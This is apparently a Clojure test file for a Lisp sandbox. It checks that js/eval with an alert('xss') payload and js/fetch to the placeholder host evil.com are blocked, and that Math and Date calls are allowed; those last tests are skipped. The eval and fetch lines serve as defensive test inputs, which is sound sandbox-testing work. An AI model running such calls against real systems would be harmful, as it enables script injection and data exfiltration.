(ns lexicon.lisp.security-test
  "Lisp API tests for security constraints.

  Tests that the SCI sandbox properly blocks dangerous operations:
  - js/eval: Blocked (XSS vector)
  - js/fetch: Blocked (data exfiltration)
  - Safe JS allowed: Math, Date (pending)

  JUSTIFICATION: Security constraints must be tested at the Lisp eval level
  to verify that the sandbox properly rejects malicious code. These cannot
  be tested via keyboard since the code never reaches the UI."
  (:require [clojure.test :refer [deftest is testing use-fixtures]]
            [lexicon.test-helpers :as h]
            [lexicon.lisp.helpers :as lisp]))

(use-fixtures :once h/with-driver)

;; =============================================================================
;; Dangerous Operations (Must Be Blocked)
;; =============================================================================

(deftest test-js-eval-blocked
  (testing "js/eval is blocked"
    (lisp/setup-test)
    (let [result (lisp/eval-lisp "(js/eval \"alert('xss')\")")]
      (is (not (:success result))
          "js/eval should be blocked"))))

(deftest test-js-fetch-blocked
  (testing "js/fetch is blocked"
    (lisp/setup-test)
    (let [result (lisp/eval-lisp "(js/fetch \"http://evil.com\")")]
      (is (not (:success result))
          "js/fetch should be blocked"))))

;; =============================================================================
;; Safe Operations (Should Be Allowed)
;; =============================================================================

(deftest ^:skip test-js-math-allowed
  (testing "js/Math is allowed"
    (lisp/setup-test)
    (let [result (lisp/eval-lisp! "(js/Math.sqrt 16)")]
      (is (= 4.0 result)))))

(deftest ^:skip test-js-date-allowed
  (testing "js/Date is allowed"
    (lisp/setup-test)
    (let [result (lisp/eval-lisp "(js/Date.)")]
      ;; May or may not work depending on SCI config
      (is (some? result) "Should return something"))))
